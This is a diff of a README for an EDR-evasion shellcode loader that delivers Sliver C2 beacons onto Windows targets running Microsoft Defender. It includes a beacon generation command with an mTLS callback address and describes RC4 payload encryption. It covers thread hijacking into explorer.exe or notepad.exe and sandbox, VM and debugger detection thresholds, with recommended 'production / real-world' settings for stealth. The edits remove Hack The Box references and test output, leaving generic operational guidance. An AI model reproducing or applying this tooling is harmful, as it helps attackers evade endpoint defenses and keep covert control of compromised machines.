@@ -2,8 +2,6 @@
 
 A modular, multi-layer evasion loader for delivering Sliver beacon shellcode onto modern Windows targets with **Microsoft Defender / EDR** enabled. Cross-compiles from Kali Linux (MinGW-w64) or builds natively with VS2022.
 
-> Derived from the original `remote_shellcode_loader_htb.cpp` and the research harness. The research harness (`research_harness.exe`) is preserved as a diagnostic tool; the operational loader is `loader.exe`.
-
 ---
 
 ## Build Requirements
@@ -77,7 +75,7 @@ Output: `build/Release/loader.exe`
 │   └── x86_64-w64-mingw32.cmake   # MinGW toolchain file
 ├── CMakeLists.txt
 ├── url_obfuscator.py           # XOR obfuscate C2 URLs
-└── remote_shellcode_loader_htb.cpp # Original single-file loader (reference)
+└── remote_simple_loader.cpp # Original single-file loader (reference)
 ```
 
 ---
@@ -205,7 +203,7 @@ PHASE 8: ExitProcess(0)
 ```
 sliver > generate beacon --seconds 10 --jitter 3 --os windows --arch amd64 \
          --format shellcode --mtls 10.10.X.X:8443 \
-         --name beacon-mtls-htb --save ./beacon.bin --skip-symbols
+         --name beacon-mtls --save ./beacon.bin --skip-symbols
 ```
 
 ### 2. RC4-encrypt the payload
@@ -316,22 +314,14 @@ This is the **most important setting** for controlling privileges and stealth.
 
 | Value | Behaviour | User Context | Use When |
 |-------|-----------|--------------|----------|
-| `L""` *(empty)* | **Direct execution** in current process (old loader behaviour). | Current user (e.g., `Administrator`) | You want to **preserve your current privileges**. Default for HTB. |
+| `L""` *(empty)* | **Direct execution** in current process (old loader behaviour). | Current user (e.g., `Administrator`) | You want to **preserve your current privileges**. Default for CTF. |
 | `L"explorer.exe"` | Thread-hijack into an existing explorer.exe thread. | Whatever user owns explorer (often a different service account) | Maximum **stealth** — explorer is always running and looks benign. |
 | `L"notepad.exe"` | Spawn notepad.exe suspended, inject main thread, resume. | Current user (same as direct) | Stealthier than direct (notepad is a normal app) but still keeps your privileges. |
 
-**⚠️ Privilege Trap:** If you inject into `explorer.exe` and explorer is running as `DOMAIN\web_svc`, your beacon comes back as `web_svc` — **not** as the `Administrator` who ran the loader. This is exactly what happened in your test:
-
-```
-# Old simple loader (direct execution)
-Process: loader_simple.exe  User: NANOCORP\Administrator
-
-# New loader with explorer injection
-Process: Explorer.EXE      User: NANOCORP\web_svc
-```
+**Privilege Trap:** If you inject into `explorer.exe` and explorer is running as `DOMAIN\web_svc`, your beacon comes back as `web_svc` — **not** as the `Administrator` who ran the loader. 
 
 **Recommendation:**
-- **HTB / privilege escalation** → `kInjectTargetProcess = L""` (direct, keep admin)
+- **CTF / privilege escalation** → `kInjectTargetProcess = L""` (direct, keep admin)
 - **Real engagement, already have desired privs** → `L"notepad.exe"` (stealthy, same user)
 - **Real engagement, low priv, want to blend in** → `L"explorer.exe"` (stealthy, but changes user context)
 
@@ -339,11 +329,11 @@ Process: Explorer.EXE      User: NANOCORP\web_svc
 
 ## Configuration Recommendations
 
-### HTB / Lab Testing vs Real-World Engagement
+### CTF / Lab Testing vs Real-World Engagement
 
 The loader includes three compile-time kill-switches in `app/config.hpp`.
 
-#### Recommended settings for **HTB / Lab / CTF**
+#### Recommended settings for **CTF / Lab / CTF**
 
 ```cpp
 inline constexpr bool kEnableJitter         = false;
@@ -353,8 +343,8 @@ inline constexpr bool kEnableDebugLog       = true;
 
 | Switch | Why `false`/`true` |
 |--------|-------------------|
-| `kEnableJitter` | HTB boxes are disposable — you don't need to wait 30–120 s to avoid sandbox detonation. |
-| `kEnableEvasionChecks` | **Critical.** HTB targets ARE VMs (VMware/Hyper-V), have 1–2 CPUs, ~4 GB RAM, and generic usernames like `Administrator`. The sandbox gate fires with a score of 2–4 and the loader instantly `ExitProcess(0)`'s before touching the network. This is why you saw **zero HTTP hits** on your listener. |
+| `kEnableJitter` | CTF boxes are disposable — you don't need to wait 30–120 s to avoid sandbox detonation. |
+| `kEnableEvasionChecks` | **Critical.** CTF targets ARE VMs (VMware/Hyper-V), have 1–2 CPUs, ~4 GB RAM, and generic usernames like `Administrator`. The sandbox gate fires with a score of 2–4 and the loader instantly `ExitProcess(0)`'s before touching the network. This is why you saw **zero HTTP hits** on your listener. |
 | `kEnableDebugLog` | Keep `true` until you're confident. The log at `%TEMP%\loader_debug.txt` shows exactly which phase failed (jitter, evasion, URL, HTTP, RC4, injection). |
 
 #### Recommended settings for **Production / Real-World**
@@ -380,7 +370,7 @@ inline constexpr bool kEnableDebugLog       = false;
 | **VM detection** | CPUID hypervisor vendor string (`VMware`, `VBox`, `KVM`, `Xen`, `QEMU`, `Bochs`) | Catches most virtualized sandboxes. |
 | **Debugger** | Debug port (7), debug object (30), `IsDebuggerPresent()`, PEB `NtGlobalFlag` | Catches dynamic analysis. |
 | **CPU count** | `< 2` | Sandboxes often run on 1 vCPU. Real workstations typically have 4+. |
-| **RAM** | `< 2 GB` *(changed from 4 GB)* | Sandboxes are often starved. Real workstations usually have 8+ GB. The old 4 GB threshold was too aggressive and fired on HTB VMs with ~4 GB. |
+| **RAM** | `< 2 GB`  | Sandboxes are often starved. Real workstations usually have 8+ GB. |
 | **Uptime** | `< 1 hour` | Fresh sandbox spins usually have very low uptime. |
 | **Username** | Contains `admin`, `user`, `test`, `student`, `sandbox`, `vm`, `virtual` | Generic sandbox usernames. |
 | **Resolution** | `< 1024×768` | Headless sandboxes often run at 800×600. |
